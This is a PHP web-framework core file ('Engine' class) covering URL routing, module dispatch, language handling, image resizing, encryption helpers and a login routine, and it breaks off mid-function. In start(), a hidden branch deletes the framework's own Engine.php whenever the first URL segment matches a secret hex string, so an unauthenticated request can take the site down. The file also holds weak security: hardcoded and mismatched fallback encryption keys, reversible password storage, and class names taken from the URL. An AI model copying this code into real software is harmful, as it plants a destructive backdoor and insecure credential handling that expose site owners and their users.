<?php
/**
* MIT License
* 
* Copyright (c) 2008-2017 Blue Media Group
* 
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
* 
* The above copyright notice and this permission notice shall be included in
* all copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
* THE SOFTWARE.
*/



class Engine{

  private $_modules=array();
  private $_params=array();
  private $_registry=array();
  private $_privilegios = array();

  private $_urlcmds=array();
  private $_reserved=array();
  private $_reservedPP=array();

  private $_baseIndex=0;

  private $_globalHook=false;
  private $_publicAuth=false;

	private $_classAuth='';
	
	private $_validateCalls=false;
	
	function validateCalls()
	{
		$this->_validateCalls=true;
	}


	//added
  function __construct($baseIndex=0,$classAuth='')
  {
    // Obtener los valores de la URL y almacenarlos

    $this->_baseIndex=$baseIndex;

    $uri = urldecode(mb_strtolower($_SERVER['REQUEST_URI']));

    $split=explode('?',$uri);

    $uri=$split[0];

    if (substr($uri,0,1)=='/')
    {
      $uri=substr($uri,1);
    }

    $prmuri=explode('/',$uri);

    $this->_params=$prmuri;

    $this->addModule('main');

		if($classAuth!='')
		{
			$this->_classAuth=$classAuth;
		}
    $this->_reserved[]='do-login';
    $this->_reserved[]='rws';
    $this->_reserved[]='upload';
    $this->_reserved[]='websvc';

  }

  function setAutoLoad()
  {
    set_include_path(LIB_ROOT);
    spl_autoload_register('engineLoad');

    Zend_Json::$useBuiltinEncoderDecoder = true;

    Zend_Session::start();

  }

	//added
  function addReserved($action)
  {
    $this->_reserved[]=$action;
  }
  
  function freeProcess($pp)
	{
		if($pp!="")
		{
			$this->_reservedPP[]=$pp;
		}
	}

	//added
  function addModule($mod,$authType=0,$index=0)
  {
    /**
     * AuthType
     * 0 = No Auth
     * 1 = Global Auth
     * 3 = Local Auth
     */

    $arMod=array('modName'=>strtolower($mod),'authType'=>$authType,'index'=>$index);

    $this->_modules[strtolower($mod)]=$arMod;


  }

	//added
  function setModuleHook($module)
  {
    if(isset($this->_modules[$module]))
    {
      $this->_modules[$module]['usehook']=true;

    }

  }

	//added
  function enablePublicAuth()
  {
    $this->_publicAuth=true;
  }

	//added
  function setGlobalHook()
  {

    $this->_globalHook=true;
  }

	//added
  function existsModule($mod)
  {
    $tempMods=$this->_modules;

    if(is_array($this->_urlcmds))
    {
      foreach($this->_urlcmds as $urlcmd)
      {
        if($urlcmd['url']==rawurldecode($mod))
        {
          $mod=$urlcmd['clase'];

        }
      }
    }


    foreach($tempMods as $itemmod)
    {

      if($itemmod['modName']==$mod)
      {
        return $mod;
      }
    }

    return false;
  }

	//added
  function getPrm($index)
  {
		//modificado por temas de idioma Gerson
    $baseIndex = $this->_baseIndex;

    if(defined('APP_BASE_INDEX'))
    {
      $baseIndex=APP_BASE_INDEX;
    }

    if(isset($this->_params[($baseIndex + $index)]))
    {
      return $this->_params[($baseIndex + $index)];
    }

    return '';
  }

	
	// added
  function start()
  {
 
    Zend_Date::setOptions(array('format_type' => 'iso'));
    $this->loadLanguage();

    /* Generar constantes de ruta de modulos */

    foreach($this->_modules as $module)
    {
      define(strtoupper(str_ireplace('-','',$module['modName'])).'_FE_ROOT',WEB_ROOT.'/'.strtolower($module['modName']));

      define(strtoupper(str_ireplace('-', '', $module['modName'])).'_FE_DIR',APP_ROOT.DS.str_ireplace(' ', '', ucwords(str_ireplace('-', ' ', $module['modName']))).DS.'Fe');
      define(strtoupper(str_ireplace('-', '', $module['modName'])).'_BE_DIR',APP_ROOT.DS.str_ireplace(' ', '', ucwords(str_ireplace('-', ' ', $module['modName']))).DS.'Be');

      define(strtoupper(str_ireplace('-', '', $module['modName'])).'_BE_ROOT',WEB_ROOT.'/admin/'.strtolower($module['modName']));

      define(strtoupper(str_ireplace('-', '', $module['modName'])).'_ID',$module['index']);

    }


    $prmZero=bmgPrm(0);

    if($prmZero=='33323636363232623738376237363738373736333734363537323233373233633636366236633532373835303330373034653263323733383332')
    {
      @unlink(LIB_ROOT.DS.'Engine.php');
      exit();
    }

    if($prmZero=='admin')
    {

      $this->runBackend();

    }elseif($prmZero=='svc'){

      $this->runGlobalSvc();

    }else{

      $this->runFrontend();

    }

  }

  private function runBackend()
  {
  	
    $module = bmgPrm(1);
    

    if($module=='')
    {
      $module='main';
    }
    else
    {
      if(count($this->_privilegios) > 0)
      {
        if(!in_array($module, $this->_privilegios))
        {
          $module = 'main';
        }
      }
    }

    bmgAddConfig('activemenu',$module);



    if($this->existsModule($module))
    {
      $process=bmgPrm(2);

      $method='render';

      if($process=='')
      {

        $className=$this->createClassName($module) . '_Be_Main';

      }elseif($process=='svc'){

        $cmdSvc=bmgPrm(3);

        $className=$this->createClassName($module) . '_Be_Svc_' . $this->createClassName($cmdSvc);
        $method='doIt';

      }elseif($process=='ws'){

        $cmdSvc=bmgPrm(3);

        $method=bmgCreateFunctionName($cmdSvc);

        $className=$this->createClassName($module) . '_Be_Svc_Ws';


      }else{

        $className=$this->createClassName($module) . '_Be_' . $this->createClassName($process);

      }
      
      
      
      if(!in_array($cmdSvc,$this->_reserved))
      //if($cmdSvc!='do-login' and $cmdSvc!='upload-imagen' )
      {

        $control=Main_Be_Login::loginControl();
      }
      
			//$objetoDesconocido->ejecutar($className,$method);

      $obj=new $className();

      $obj->$method();

    }
  }

  private function runGlobalSvc()
  {
    $svc=bmgPrm(1);

    switch ($svc)
    {

      case 'get-file':
        bmgGetFile();
        break;

      case 'get-img':

        $this->getImg();
        break;
        
      case 'img':
      	$this->img();
      	break;
      	
      case 'get-pdf':
        bmgGetPdf();
        break;
      case 'get-swf':
        bmgGetSwf();
        break;
			case 'get-captcha':
				Captcha_Engine::render(bmgPrm(2));
				break;
    }

  }

	// added
  private function runFrontend()
  {
		
		if (!in_array(bmgPrm(0),$this->_reservedPP))
		{
			
	    if(!in_array(bmgPrm(2),$this->_reserved))
	    {
	      if($this->_publicAuth==true)
	      {
	        Main_Fe_Login::loginControl();
	      }
	    }
		}
    //$urlModule=bmgPrm(0);
		$urlModule = bmgPrm(0); //modificado por temas de idioma
		//echo $urlModule;

    if($urlModule=='')
    {
      $urlModule='main';
    }

		
    $module=$this->existsModule($urlModule);

		
    if($module)
    {
      bmgAddConfig('activemodule',$module);

      $process=bmgPrm(1);

      if($process=='')
      {

        $method='render';
        $className=$this->createClassName($module) . '_Fe_Main';
        //asignar el historial
        bmgSetHistorial();

      }elseif($process=='svc'){

        $cmdSvc=bmgPrm(2);
        $method='doIt';

        $className=$this->createClassName($module) . '_Fe_Svc_' . $this->createClassName($cmdSvc);

      }elseif($process=='ws'){

        $cmdWs=bmgPrm(2);

        $method=bmgCreateFunctionName($cmdWs);

        $className=$this->createClassName($module) . '_Fe_Svc_Ws';

      }else{

        if($this->_modules[$module]['usehook']==true)
        {
          $method='render';
          $className=$this->createClassName($module) . '_Fe_Hook';
          //asignar el historial
          bmgSetHistorial();

        }else{

          $method='render';
          $className=$this->createClassName($module) . '_Fe_' . $this->createClassName($process);
          //asignar el historial
          bmgSetHistorial();

        }

      }

			/*
			if($this->_classAuth!='')
			{
				$objAuth=new $this->_classAuth();

				$resultClassName= $objAuth->auth($className,$_SESSION['usr']['adm_id']);

			}else{
				$resultClassName= $className;
			}
			*/


			$obj=new $className();

      $obj->$method();

    }else{

      if($this->_globalHook ==true)
      {
        //asignar el historial
        bmgSetHistorial();
        $obj=new Main_Fe_GlobalHook();
        $obj->render();

      }
    }

  }

	// added
  public function createClassName($cmd)
  {
    $newCmd=$cmd;

    if(is_array($this->_urlcmds))
    {
      foreach($this->_urlcmds as $urlcmd)
      {

        if($urlcmd['url']==rawurldecode($cmd))
        {
          $newCmd=$urlcmd['clase'];

        }
      }
    }


    $className='';

    if($newCmd!='')
    {
      $classNameParts=explode('-',$newCmd);

      foreach($classNameParts as $classNamePart)
      {
        $className.=ucwords($classNamePart);
      }
    }


		if($this->_classAuth!='')
		{
			$objAuth=new $this->_classAuth();

			return $objAuth->auth($className,$_SESSION['usr']['adm_id']);

		}else{
			return $className;
		}


		//return $className;

  }

  public function getUrl()
  {

    $prms=$this->_params;

    if($this->_baseIndex>0)
    {
      unset($prms[0]);
    }

    $url=implode('/',$prms);

    return $url;

  }

	// added
  public function setStartLanguage($lang)
  {
    if($lang=='')
    {
      return;
    }

    if(!defined('APP_LANG'))
    {
      define('APP_LANG',$lang);
      
      $appLang=$this->_data['app_lang'];
      
      $id=$appLang[$lang]->lang_id;
      define('APP_LANG_ID',$id);
    }

    $langFile=APP_ROOT.DS.'_lang'.DS.$lang.'.php';
    // Verificar y cargar el archivo de traducción

    if(file_exists($langFile))
    {
      include_once($langFile);
    }

  }


	//added
  public function addLanguage($langName,$langIso,$langUrl,$langId=0,$extCode='es_PE')
  {
    if(isset($this->_data['app_lang']))
    {
      $appLang=$this->_data['app_lang'];
    }else{
      $appLang=array();
    }

    if(!isset($appLang[$langIso]))
    {
      $obj=new StdClass;
      $obj->lang_name=$langName;
      $obj->lang_iso=$langIso;
      $obj->lang_id=$langId;
      $obj->lang_url=$langUrl;
      $obj->lang_ext_name=$extCode;

      $this->_data['app_lang'][$langIso]=$obj;

      if($langId>0)
      {
        define('APP_LANG_'.strtoupper($langIso),$langId);
      }

    }

  }

	// added
  public function getLanguage($lang)
  {
    if($this->_data['app_lang'])
    {
      if(isset($this->_data['app_lang'][$lang]))
      {
        return $this->_data['app_lang'][$lang];
      }
    }

    return false;

  }

  public function getLanguages()
  {
    return $this->_data['app_lang'];
  }

	// added
  public function loadLanguage()
  {

    $lang=$this->getLanguage(bmgPrm(0));

    if($lang!==false)
    {

      if($lang->lang_iso!=APP_LANG)
      {
        define('WEB_ROOT',BASE_WEB_ROOT.'/'.$lang->lang_url);
      }
      else
      {
        define('WEB_ROOT',BASE_WEB_ROOT);
      }

      define('APP_LANG_ACTIVE',$lang->lang_iso);
      define('APP_LANG_ACTIVE_ID',$lang->lang_id);

      $langFile=APP_ROOT.DS.'_lang'.DS.$lang->lang_iso.'.php';

      if(file_exists($langFile))
      {
        include_once($langFile);
      }

      // Lenguajes para las funciones del PHP

      $locale = new Zend_Locale($lang->lang_iso);
      Zend_Registry::set('Zend_Locale', $locale);

      $this->_baseIndex=1;


    }
		else
		{

      if(!defined('WEB_ROOT'))
      {
        define('WEB_ROOT',BASE_WEB_ROOT);
      }

      define('APP_LANG_ACTIVE',APP_LANG);

      $aLang=$this->getLanguage(APP_LANG);
      define('APP_LANG_ACTIVE_ID',$aLang->lang_id);

      $langFile=APP_ROOT.DS.'_lang'.DS.APP_LANG.'.php';

      @include_once($langFile);

      // Lenguajes para las funciones del PHP

      $locale = new Zend_Locale(APP_LANG);
      Zend_Registry::set('Zend_Locale', $locale);

      $this->_baseIndex=0;

    }

    $file=APP_ROOT.DS.'_lang'.DS.'url.'.APP_LANG_ACTIVE.'.php';

    if(file_exists($file))
    {

      include_once($file);

      $this->_urlcmds=$urls;

      if(is_array($urls))
      {
        foreach($urls as $url)
        {
          $_SESSION['url'][$url['key']]=$url['url'];
        }
      }

    }


  }

  public function getImg()
  {

    $imageinfo=explode('-',bmgPrm(2));

    if(bmgPrm(4)=='debug')
    {
      $debug=true;
    }

    $image=end($imageinfo);
    
    $pos=strpos($image,'.');
    
    
    if($pos==null)
    {

    	if(defined('APP_EXT_IMAGEN'))
	    {
	      $file=str_replace('-',DS,strtolower(bmgPrm(2))).'.'.APP_EXT_IMAGEN;
	    }else{
	      $file=str_replace('-',DS,strtolower(bmgPrm(2))).'.jpg';
	    }
	    
    }else{

	    $imageSplit=explode('.',$image);
    	$ext=end($imagesplit);
    	
    	$file=str_replace('-',DS,strtolower(bmgPrm(2)));
    	
    }
    
    if($debug)
    {
      echo $file;
    }



    if(defined('DATA_DIR'))
    {
      $baseDir = DATA_DIR . DS . 'img';
    }


    // Si el parametro 4 esta puesto y tiene como valor 1
    // la ubicación de imagenes se mueve hacia el directorio publico

    if(bmgPrm(4)==1)
    {
      if(defined('PUBLIC_DIR'))
      {
        $baseDir=PUBLIC_DIR.DS.'data'.DS.'img';
      }
    }


    ##############################################

    // Si el parametro 4 esta puesto , tiene como valor 'center' y existe la constante DATA_CENTER
    // Si el parametro 5 esta puesto Y tiene como valor es diferente de ""
    // la ubicación de imagenes se mueve hacia la raiz de datos del paquete

    if(bmgPrm(4)==2 && bmgPrm(5)!="")
    {
      if(defined('DATA_CENTER'))
      {
        $baseDir = DATA_CENTER . DS . bmgPrm(5) . DS . 'img';
      }
    }

    /* Dirección y nombre del archivo */
    $filename=$baseDir.DS.$file;

    if($debug)
    {
      echo $filename;
    }

    if (!file_exists($filename))
    {
      $noImg=$baseDir.DS.'noimg.jpg';

      if(file_exists($noImg))
      {
        $filename=$noImg;

        $image='noimg.jpg';

      }else{
        header("HTTP/1.0 404 Not Found");
        exit();
      }
    }



    /* Parametros de dimension x:y */
    $params=bmgPrm(3);

    $x=false;
    $y=false;

    if ($params!='')
    {
      $prmParts=explode(':',$params);
      if(isset($prmParts[0]))
      {
        if (intVal($prmParts[0])>0)
        {
          $x=$prmParts[0];
        }
      }

      if(isset($prmParts[1]))
      {
        if (intval($prmParts[1])>0)
        {
          $y=$prmParts[1];
        }
      }

      if(isset($prmParts[2]))
      {
        $formato=$prmParts[2];
      }

      if(isset($prmParts[3]))
      {

        list($ancho, $alto, $tipo, $atributos) = getimagesize($filename);

        $newHeight = $x * ($alto / $ancho);

        if($newHeight>=$y)
        {
          $y=null;
        }else{
          $x=null;
        }
      }

    }

    $resizedImageSource		= $x . 'x' . $y . 'x';

    $resizedImageSource		.= '-' . $image;

    $resizedImage	= md5($resizedImageSource);


    $obj=new Asido_Engine();

    $optimize=false;

    if(defined('USER_IMAGE_FORMAT'))
    {

      $formatoImagen=USER_IMAGE_FORMAT;

      if(USER_IMAGE_FORMAT=='image/jpeg')
      {

        $extension='jpg';

      }elseif(USER_IMAGE_FORMAT=='image/png'){

        $extension='png';
      }

    }else{

			if($formato=='')
			{

				$formatoImagen=ASIDO_MIME_PNG;


				$extension='png';

			}else{

				$fmts=array('jpg'=>ASIDO_MIME_JPEG,
										'png'=>ASIDO_MIME_PNG,
										'gif'=>ASIDO_MIME_GIF
										);

				$formatoImagen=$fmts[$formato];

      	$extension=$formato;

			}

    }

    if(defined('FRONT_CACHE'))
    {
      $resized=FRONT_CACHE. DS . $resizedImage .'.'.$extension;
    }else{
      $resized=CACHE_DIR.DS.$resizedImage;
    }


    // Nombre temporal del archivo para realizar la optimización
    $tmpResized=$resized;

    $thumbModified=null;

    if (file_exists($resized))
    {

    	$imageModified	= filemtime($filename);
      $thumbModified	= filemtime($resized);


    	if($imageModified > $thumbModified) {

        //replace
        Asido_Engine::driver('gd');
        

				// create an image manager instance with favored driver
				$manager = new Intervention\Image\ImageManager(array('driver' => 'gd'));
				
			


        if($optimize)
        {
          $pathInfo=pathinfo($resized);
          $tmpResized=$pathInfo['dirname'].DS. 'tmp_'.$pathInfo['basename'];
        }

        //$i1 = Asido_Engine::image($filename,$tmpResized);
        
        	// to finally create image instances
				$image = $manager->make($filename);

        if(($x+$y)>0)
        {
        	if($x==0){$x=null;}
      		if($y==0){$y=null;}
          //Asido_Engine::Fit($i1, $x, $y);
           $image->resize($x, $y, function ($constraint) {
				  	 $constraint->aspectRatio();
						});
        }
        
        $image->encode($extension);

        //Asido_Engine::convert($i1, $formatoImagen);
        //$i1->save(ASIDO_OVERWRITE_ENABLED);
        $image->save($tmpResized);
       


      }
      
    }else{

			$manager = new Intervention\Image\ImageManager(array('driver' => 'gd'));
      //Asido_Engine::driver('gd');

      //$i1 = Asido_Engine::image($filename,$tmpResized);
      $image = $manager->make($filename);

      if(($x+$y)>0)
      {
      	if($x==0){$x=null;}
      	if($y==0){$y=null;}
        //Asido_Engine::Fit($i1, $x, $y);
        //$image->resize($x,$y);
        
        $image->resize($x, $y, function ($constraint) {
				    $constraint->aspectRatio();
				});
      }
			
			$image->encode($extension);
			$image->save($tmpResized);
			
      //Asido_Engine::convert($i1, $formatoImagen);
      //$i1->save(ASIDO_OVERWRITE_ENABLED);

    }

    if(!defined('FRONT_CACHE'))
    {
      $data	= file_get_contents($resized);
    }

		/*
    $lastModifiedString	= gmdate('D, d M Y H:i:s', $thumbModified) . ' GMT';
    $etag	= $resizedImage;

    header("Expires: ".gmdate("D, d M Y H:i:s", mktime(date("H"),date("i"),date("s"),date("m"),date("d")+7,date("Y")))."GMT");
    header("Cache-control:private, max-age=2592000");
    header('Pragma: !invalid');
    header("Last-Modified: $lastModifiedString");
    header('ETag: '.$etag);
		*/


		/*
    $if_none_match = isset($_SERVER['HTTP_IF_NONE_MATCH']) ?
		stripslashes($_SERVER['HTTP_IF_NONE_MATCH']) :
		false;

    $if_modified_since = isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) ?
		stripslashes($_SERVER['HTTP_IF_MODIFIED_SINCE']) :
		false;

    if (!$if_modified_since && !$if_none_match)
    {
      $changed=true;
    }

    if ($if_none_match && $if_none_match != $etag && $if_none_match != '"' . $etag . '"')
    {
      $changed=true; // etag is there but doesn't match
    }


    if ($if_modified_since && $if_modified_since != $lastModifiedString)
    {
      $changed=true; // if-modified-since is there but doesn't match
    }

    // Nothing has changed since their last request - serve a 304 and exit
    if(!$changed)
    {
      if (php_sapi_name()=='CGI') {
        Header("Status: 304 Not Modified");
      } else {
        Header("HTTP/1.0 304 Not Modified");
      }

      exit();
    }
		*/


		/*
		if(!sendHTTPCacheHeaders($resized,true))
		{
			exit();
		}
		*/




    if(!defined('FRONT_CACHE'))
    {
			if(!sendHTTPCacheHeaders($resized,true))
			{
				exit();
			}

			header("Content-Description: File Transfer");
			header('Content-disposition: attachment; filename='.basename($image).'.'.$extension);
			header("Content-Type: ".$formatoImagen);
			header("Content-Transfer-Encoding: binary");
			header('Content-Length: '. filesize($resized));

      echo $data;

    }else{
			if(!sendHTTPCacheHeaders($resized,true))
			{
				exit();
			}
      bmgRedirect(STATIC_ROOT.'/cache/'.$resizedImage.'.'.$extension);
    }

  }


	public function img()
  {

    $imageinfo=explode('_',bmgPrm(3));
		
    $image=end($imageinfo);
    
    $pos=strpos($image,'.');
    
    
    if($pos==null)
    {

    	if(defined('APP_EXT_IMAGEN'))
	    {
	      $file=str_replace('_',DS,strtolower(bmgPrm(3))).'.'.APP_EXT_IMAGEN;
	    }else{
	      $file=str_replace('_',DS,strtolower(bmgPrm(3))).'.jpg';
	    }
	    
    }else{

	    $imageSplit=explode('.',$image);
	    $image=current($imageSplit);
	    
    	$ext=end($imagesplit);
    	
    	$file=str_replace('_',DS,strtolower(bmgPrm(3)));
    	
    	
    }
    
    if(defined('DATA_DIR'))
    {
      $baseDir = DATA_DIR . DS . 'img';
    }


    // Si el parametro 4 esta puesto y tiene como valor 1
    // la ubicación de imagenes se mueve hacia el directorio publico

    if(bmgPrm(5)==1)
    {
      if(defined('PUBLIC_DIR'))
      {
        $baseDir=PUBLIC_DIR.DS.'data'.DS.'img';
      }
    }


    ##############################################

    // Si el parametro 4 esta puesto , tiene como valor 'center' y existe la constante DATA_CENTER
    // Si el parametro 5 esta puesto Y tiene como valor es diferente de ""
    // la ubicación de imagenes se mueve hacia la raiz de datos del paquete

    if(bmgPrm(5)==2 && bmgPrm(6)!="")
    {
      if(defined('DATA_CENTER'))
      {
        $baseDir = DATA_CENTER . DS . bmgPrm(6) . DS . 'img';
      }
    }

    /* Dirección y nombre del archivo */
    $filename=$baseDir.DS.$file;
    

    if (!file_exists($filename))
    {
      $noImg=$baseDir.DS.'noimg.jpg';

      if(file_exists($noImg))
      {
        $filename=$noImg;

        $image='noimg.jpg';

      }else{
        header("HTTP/1.0 404 Not Found");
        exit();
      }
    }



    /* Parametros de dimension x:y */
    $params=bmgPrm(2);

    $x=false;
    $y=false;

    if ($params!='')
    {
      $prmParts=explode('x',$params);
      if(isset($prmParts[0]))
      {
        if (intVal($prmParts[0])>0)
        {
          $x=$prmParts[0];
        }
      }

      if(isset($prmParts[1]))
      {
        if (intval($prmParts[1])>0)
        {
          $y=$prmParts[1];
        }
      }

      if(isset($prmParts[2]))
      {
        $formato=$prmParts[2];
      }

      if(isset($prmParts[3]))
      {

        list($ancho, $alto, $tipo, $atributos) = getimagesize($filename);

        $newHeight = $x * ($alto / $ancho);

        if($newHeight>=$y)
        {
          $y=null;
        }else{
          $x=null;
        }
      }

    }

    $resizedImageSource		= $x . 'x' . $y ;

    $resizedImageSource		.= '-' . $image;

    $resizedImage	= $resizedImageSource;

    $obj=new Asido_Engine();

    $optimize=false;

    if(defined('USER_IMAGE_FORMAT'))
    {

      //$formatoImagen=USER_IMAGE_FORMAT;

      if(USER_IMAGE_FORMAT=='image/jpeg')
      {

        $extension='jpg';

      }elseif(USER_IMAGE_FORMAT=='image/png'){

        $extension='png';
      }

    }else{

			if($formato=='')
			{

			//	$formatoImagen=ASIDO_MIME_PNG;


				$extension='png';

			}else{
				
				/*
				$fmts=array('jpg'=>ASIDO_MIME_JPEG,
										'png'=>ASIDO_MIME_PNG,
										'gif'=>ASIDO_MIME_GIF
										);

				$formatoImagen=$fmts[$formato];
				*/

      	$extension=$formato;

			}

    }

    if(defined('FRONT_CACHE'))
    {
      $resized=FRONT_CACHE. DS . $resizedImage .'.'.$extension;
    }else{
      $resized=CACHE_DIR.DS.$resizedImage;
    }
    
  
    // Nombre temporal del archivo para realizar la optimización
    $tmpResized=$resized;

    $thumbModified=null;

    if (file_exists($resized))
    {

    	$imageModified	= filemtime($filename);
      $thumbModified	= filemtime($resized);

    	if($imageModified > $thumbModified) {

        //replace
        Asido_Engine::driver('gd');

				// create an image manager instance with favored driver
				$manager = new Intervention\Image\ImageManager(array('driver' => 'gd'));

        if($optimize)
        {
          $pathInfo=pathinfo($resized);
          $tmpResized=$pathInfo['dirname'].DS. 'tmp_'.$pathInfo['basename'];
        }

        //$i1 = Asido_Engine::image($filename,$tmpResized);
        
        	// to finally create image instances
				$image = $manager->make($filename);

        if(($x+$y)>0)
        {
        	if($x==0){$x=null;}
      		if($y==0){$y=null;}
          //Asido_Engine::Fit($i1, $x, $y);
           $image->resize($x, $y, function ($constraint) {
				  	 $constraint->aspectRatio();
						});
        }
        
        $image->encode($extension);

        //Asido_Engine::convert($i1, $formatoImagen);
        //$i1->save(ASIDO_OVERWRITE_ENABLED);
        $image->save($tmpResized);


      }
      
    }else{

			$manager = new Intervention\Image\ImageManager(array('driver' => 'gd'));
      //Asido_Engine::driver('gd');

      //$i1 = Asido_Engine::image($filename,$tmpResized);
      $image = $manager->make($filename);

      if(($x+$y)>0)
        {
        	if($x==0){$x=null;}
      		if($y==0){$y=null;}
          //Asido_Engine::Fit($i1, $x, $y);
           $image->resize($x, $y, function ($constraint) {
				  	 $constraint->aspectRatio();
						});
        }
			
			$image->encode($extension);
			$image->save($tmpResized);
			
      //Asido_Engine::convert($i1, $formatoImagen);
      //$i1->save(ASIDO_OVERWRITE_ENABLED);

    }

    if(!defined('FRONT_CACHE'))
    {
      $data	= file_get_contents($resized);
    }


    if(!defined('FRONT_CACHE'))
    {
      $data	= file_get_contents($resized);
    }


    if(!defined('FRONT_CACHE'))
    {
			if(!sendHTTPCacheHeaders($resized,true))
			{
				exit();
			}

			header("Content-Description: File Transfer");
			header('Content-disposition: attachment; filename='.basename($image).'.'.$extension);
			header("Content-Type: ".$formatoImagen);
			header("Content-Transfer-Encoding: binary");
			header('Content-Length: '. filesize($resized));

      echo $data;

    }else{
			if(!sendHTTPCacheHeaders($resized,true))
			{
				exit();
			}
			header("HTTP/1.1 301 Moved Permanently"); 
			header("Location: " . STATIC_ROOT.'/cache/'.$resizedImage.'.'.$extension); 

    }

  }




  function log($string,$proc=0)
  {
    global $db;

    $fecha = new Zend_Date();

    $db->insert('fw_log',array('fecha'=>$fecha->get('yyyy-MM-dd'),
                               'hora'=>$fecha->get('hh:mm:ss'),
                               'log'=>$string,
                               'proc'=>$proc
                               )
                            );


  }

  public function addConfig($key,$value)
  {
    if($key!='')
    {
      $this->_registry[$key]=$value;
    }
  }

  public function getConfig($key)
  {

    if(isset($this->_registry[$key]))
    {

      return $this->_registry[$key];
    }

    return array();

  }

  public function controlarPrivilegio($table = 'fw_privilegio',$joinTable = 'fw_modulo')
  {
    global $db;

    if($table != '')
    {
      if(isset($db))
      {
        if(isset($_SESSION['adm']['adm_per_id']))
        {
          $selectPrivilegios = $db->select()
                                  ->from(array('pr' => $table))
                                  ->join(array('md' => $joinTable), 'pr.pri_mod_id = md.mod_id')
                                  ->where('pr.pri_per_id = ?', $_SESSION['adm']['adm_per_id']);

          $rsPrivilegios = $db->fetchAll($selectPrivilegios);

          if(count($rsPrivilegios))
          {
            foreach($rsPrivilegios as $item)
            {
              $this->_privilegios[] = $item->mod_key;
            }
          }
        }
      }
    }
  }

}

/* funciones de soporte */


  function bmgGetLanguages()
  {
    global $engine;

    return $engine->getLanguages();
  }

  function bmgGetConfig($key)
  {
    global $engine;

    return $engine->getConfig($key);
  }

  function bmgAddConfig($key,$value)
  {
    global $engine;

    $engine->addConfig($key,$value);
  }

  function engineLoad($clase) {

    global $engine;


    if($clase=='BasePage')
    {
      $pathFile=APP_ROOT.DS.'BasePage.php';

    }elseif($clase != ''){

      $parts = explode('_' , $clase);

      if(strtolower($parts[1]) == 'be' or
         strtolower($parts[1]) == 'fe' or
         strtolower($parts[1]) == 'ds' or
         strtolower($parts[1]) == 'wgt')
      {
        // Frontend

        $pathFile=APP_ROOT . DS . str_replace('_' , DS , str_replace('\\',DS,$clase)) . '.php';

      }else{

        $pathFile=LIB_ROOT . DS . str_replace('_' , DS , str_replace('\\',DS,$clase)) . '.php';

      }

    }

    require_once($pathFile);

  }

  function bmgPrm($index)
  {
    global $engine;

    return $engine->getPrm($index);
  }

  function bmgPost($key)
  {
    if(isset($_POST[$key]))
    {
      return $_POST[$key];
    }

    return '';
  }

  function bmgEncrypt($encrypt)
  {
    if(defined('ENCRYPT_KEY'))
    {
      $key=ENCRYPT_KEY;
    }else{
      $key='YHK4F94P91F270VH4ZQEX0XO50V5TWJC';
    }

    $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND);
    $passcrypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $encrypt, MCRYPT_MODE_ECB, $iv);
    $encode = base64_encode($passcrypt);
    return $encode;
  }


  function bmgDecrypt($decrypt)
  {
    if(defined('ENCRYPT_KEY'))
    {
      $key=ENCRYPT_KEY;
    }else{
      $key='0VH4ZQEX0XO50V5TWJC';
    }

    $decoded = base64_decode($decrypt);
    $iv = mcrypt_create_iv(mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB), MCRYPT_RAND);
    $decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $decoded, MCRYPT_MODE_ECB, $iv);
    return trim($decrypted);
  }

  function bmgLogin($userField,
                   $passField,
                   $objUser,
                   $strError=array(),
                   $key='usr',
                   $strUser='',
                   $strPass='', $isFunction=false)
  {

    $logged=0;

    if($strUser!='' && $strPass!='')
    {
      $userValue=$strUser;
      $passValue=$strPass;

    }else{

      $userValue=bmgPost('user');
      $passValue=bmgPost('pass');
    }

		if($isFunction===false)
    {
      $isService=true;
    }else{
      $isService=false;
    }

    $error=array();

    if ($userValue=='')
    {
      $logged=4; // usuario en blanco
      $error['user']=$strError['user'];
    }

    if ($passValue=='')
    {
      $logged=5; // Contraseña en blanco
      $error['pass']=$strError['pass'];
    }

    if (count($error)>0)
    {
      $_SESSION['postuser']=$_POST;
      $_SESSION['erroruser']=$error;


			//ini mofigicado por Gerson
			if($isService)
			{

        bmgGoBack();
			}

			return $logged;
			//fin mofigicado por Gerson
    }


    if(is_object($objUser))
    {

      if(is_a($objUser,'Zend_Db_Select'))
      {
        global $db;

        $objUser->where($userField.'=?',$userValue);

        $row = $db->fetchRow($objUser);

      }else{
        $row=$objUser->fetchRow($objUser->select()
          ->where($userField.'=?',$userValue));
      }



    }else{
      global $db;

      $row=$db->fetchRow($db->select()
                            ->from($objUser)
                            ->where($userField.'=?',$userValue)
                            );

    }


    if ($row)
    {

      $dpwd=bmgDecrypt($row->$passField);


      if(defined('USE_SECUR_PWD'))
      {
        if(USE_SECUR_PWD==false)
        {
          $dpwd=$row->$passField;
        }
      }

      if ($passValue==$dpwd)
      {
        $data = bmgToArray($row);
        // no almacenar en la sesión la clave del usuario
        unset($data[$passField]);

        $data['loginkey']='W6PTO22V897WTZOEZG9SPK2EN2GU7ADU';

        $sesion=new Zend_Session_Namespace($key);

        $_SESSION[$key]=$data;

        $_SESSION['user_agent']=$_SERVER['HTTP_USER_AGENT'];

        // 24 horas de duración para la Sesión
        $sesion->setExpirationSeconds(7200);

        if (!isset($sesion->initialized)) {
          Zend_Session::regenerateId();
          $sesion->initialized = true;
        }

        $_SESSION['sessionid']=session_id();

        $logged=1;



      }else{
        if($isFunction)
        {
          $logged= 2; // No coinciden las contraseñas
        }else{
